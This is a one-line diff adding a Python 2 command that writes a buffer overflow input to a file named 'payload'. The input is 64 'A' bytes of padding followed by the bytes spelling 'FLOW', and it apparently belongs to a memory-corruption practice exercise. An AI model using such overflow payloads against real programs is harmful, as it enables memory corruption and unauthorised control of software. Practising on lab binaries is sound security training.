@@ -1,0 +1,1 @@
+python -c 'print "A"*64 + "\x46\x4C\x4F\x57"' > payload
